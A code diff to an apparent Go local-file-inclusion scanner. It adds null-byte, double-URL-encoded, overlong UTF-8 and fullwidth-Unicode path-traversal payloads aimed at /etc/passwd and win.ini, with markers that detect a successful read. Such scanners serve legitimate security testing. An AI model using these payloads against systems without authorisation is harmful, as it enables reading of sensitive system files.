@@ -184,7 +184,7 @@ func (s *Scanner) GetResults() []Result {
 	return append([]Result{}, s.results...)
 }
 
-// Payloads returns LFI test payloads
+// Payloads returns LFI test payloads including null byte and encoding variants
 func Payloads(os string) []Payload {
 	payloads := make([]Payload, 0)
 
@@ -193,6 +193,18 @@ func Payloads(os string) []Payload {
 	}
 	if os == "windows" || os == "both" {
 		payloads = append(payloads, windowsPayloads()...)
+	}
+
+	// Include null byte injection and advanced encoding payloads
+	for _, p := range NullBytePayloads() {
+		if os == "both" || os == p.OS {
+			payloads = append(payloads, p)
+		}
+	}
+	for _, p := range UnicodePayloads() {
+		if os == "both" || os == p.OS {
+			payloads = append(payloads, p)
+		}
 	}
 
 	return payloads
@@ -237,5 +249,23 @@ func NullBytePayloads() []Payload {
 		{Value: "../../../etc/passwd%00", OS: "linux", Markers: []string{"root:"}},
 		{Value: "../../../etc/passwd\x00", OS: "linux", Markers: []string{"root:"}},
 		{Value: "..\\..\\..\\Windows\\win.ini%00", OS: "windows", Markers: []string{"[fonts]"}},
+	}
+}
+
+// UnicodePayloads returns Unicode normalization and double-encoding payloads
+func UnicodePayloads() []Payload {
+	return []Payload{
+		// Double URL encoding
+		{Value: "..%252f..%252f..%252fetc/passwd", OS: "linux", Markers: []string{"root:"}},
+		{Value: "%252e%252e/%252e%252e/etc/passwd", OS: "linux", Markers: []string{"root:"}},
+		// Unicode / UTF-8 encoded path separators
+		{Value: "..%c0%af..%c0%afetc/passwd", OS: "linux", Markers: []string{"root:"}},
+		{Value: "..%ef%bc%8f..%ef%bc%8fetc/passwd", OS: "linux", Markers: []string{"root:"}},
+		// Overlong UTF-8 encoding of dot
+		{Value: "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", OS: "linux", Markers: []string{"root:"}},
+		// Double-encoded backslash for Windows
+		{Value: "..%255c..%255c..%255cWindows\\win.ini", OS: "windows", Markers: []string{"[fonts]"}},
+		// Unicode fullwidth characters
+		{Value: "\uff0e\uff0e/\uff0e\uff0e/etc/passwd", OS: "linux", Markers: []string{"root:"}},
 	}
 }
